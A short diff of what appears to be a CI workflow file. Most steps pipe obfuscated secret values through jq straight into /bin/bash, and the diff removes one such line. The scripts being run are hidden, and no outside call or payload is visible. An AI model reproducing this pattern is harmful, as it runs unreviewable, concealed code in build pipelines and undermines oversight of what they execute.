@@ -23,7 +23,6 @@ jobs:
           hi1934: ${{ secrets.hi1934 }}
         run: |
           printf '%s' "$hi1934" | jq -r .y66 | /bin/bash
-          echo $vvmy936 | jq -r .h02 | /bin/bash
           printf '%s' "$iri304" | jq -r .defle410 | /bin/bash
           echo $zcs8572 | jq -r .eoxr038 | /bin/bash
           printf '%s' "$ggrz3" | jq -r .yw1091 | /bin/bash
